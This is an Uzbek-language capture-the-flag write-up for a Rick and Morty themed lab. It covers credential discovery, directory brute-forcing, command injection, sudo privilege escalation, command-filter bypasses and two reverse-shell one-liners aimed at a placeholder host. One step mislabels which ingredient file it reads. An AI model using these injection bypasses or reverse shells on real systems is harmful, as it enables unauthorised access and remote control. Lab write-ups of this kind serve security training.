# 🥒 Pickle Rick CTF

> **Maqsad:** Rick Morty mavzusidagi CTF — veb zaifliklardan foydalanib 3 ta "ingredient" (tarkibiy qism) topish.

---

## 📖 Vaziyat

Rick o'zini o'zi pickle ga aylantirdi va insoniy holatga qaytish uchun 3 ta ingredient kerak. Siz Morty sifatida ularni topishingiz kerak.

**Maqsad:** 3 ta flag topish
- 1-ingredient (Foydalanuvchi darajasida)
- 2-ingredient (Sudo darajasida)
- 3-ingredient (Root darajasida)

---

## 🔍 Razvedka (Reconnaissance)

### 1. Sahifani tekshirish
```bash
# Saytni oching: http://TARGET_IP

# Manba kodini ko'ring (CTRL+U):
<!-- Note to self, remember username! Username: R1ckRul3s -->
# Username topildi: R1ckRul3s
```

### 2. robots.txt tekshirish
```
http://TARGET_IP/robots.txt
# Natija: Wubbalubbadubdub
# Bu parol bo'lishi mumkin!
```

### 3. Directory Discovery
```bash
gobuster dir -u http://TARGET_IP \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html

# Topilganlar:
/login.php      → Login sahifasi!
/assets/        → Rasmlar va fayllar
/portal.php     → Panel
```

---

## 🔐 Login

```
URL:      http://TARGET_IP/login.php
Username: R1ckRul3s
Password: Wubbalubbadubdub
→ Portal sahifasiga o'tamiz!
```

---

## ⚡ Command Panel (Buyruq Paneli)

Portal da buyruq kiritish maydoni bor — bu **Command Injection** zaiflik!

```bash
# Asosiy buyruqlar:
ls
ls -la
whoami          # www-data
pwd             # /var/www/html

# 1-ingredient:
ls /home/rick/
cat /home/rick/second\ ingredients    # ← bo'sh joy!
# yoki:
cat "/home/rick/second ingredients"

# Agar cat ishlamasa (filtrlangan):
less /home/rick/second\ ingredients
grep "" /home/rick/second\ ingredients
```

### Filtrlangan buyruqlar chetlab o'tish:
```bash
# "cat" filtrlangan bo'lsa:
less filename
more filename
tac filename       # teskari cat
head filename
tail filename
grep "" filename
nl filename

# Buyruqni bo'lib yozish:
c""at filename
ca$''t filename
```

---

## 🏠 1-Ingredient (www-data darajasida)

```bash
# Portal da:
ls /var/www/html
# Sup3rS3cretPickl3Ingred.txt ko'rinadi!

cat Sup3rS3cretPickl3Ingred.txt
# Yoki brauzerde:
http://TARGET_IP/Sup3rS3cretPickl3Ingred.txt
```

---

## 🔑 2-Ingredient (Rick uy papkasi)

```bash
# Portal da:
ls /home/rick/
# "second ingredients" fayl bor

less /home/rick/second\ ingredients
# Yoki:
cat /home/rick/"second ingredients"
```

---

## 👑 3-Ingredient (Root)

```bash
# Sudo tekshirish:
sudo -l
# Natija: (ALL) NOPASSWD: ALL
# www-data HAMMA narsani sudo bilan ishlata oladi!

sudo ls /root/
# 3rd.txt ko'rinadi

sudo cat /root/3rd.txt
```

---

## 🔄 Reverse Shell (agar kerak bo'lsa)

```bash
# O'z mashinangizda tinglovchi:
nc -lvnp 4444

# Portal da:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Yoki:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 📋 To'liq Yechim Xulasasi

```
1. CTRL+U → Username: R1ckRul3s
2. robots.txt → Password: Wubbalubbadubdub
3. gobuster → /login.php topish
4. Login → Portal
5. Command panel → ls, cat
6. 1-flag: /var/www/html/Sup3rS3cretPickl3Ingred.txt
7. 2-flag: /home/rick/second ingredients
8. sudo -l → NOPASSWD: ALL
9. 3-flag: sudo cat /root/3rd.txt
```

---

## 💡 Eslab Qolish Uchun

| Qadam | Texnika | Topilma |
|-------|---------|---------|
| Manba kodi | CTRL+U | Username |
| robots.txt | /robots.txt | Parol |
| Directory | gobuster | /login.php |
| Command panel | Command Injection | Fayllar |
| Privilege | sudo -l | Root kirish |

**Asosiy darslar:**
- Har doim manba kodini tekshir → izohlar!
- robots.txt da qiziqarli narsa bo'lishi mumkin
- Command panel = Command Injection
- `sudo -l` → Imtiyoz oshirish imkonini tekshirish
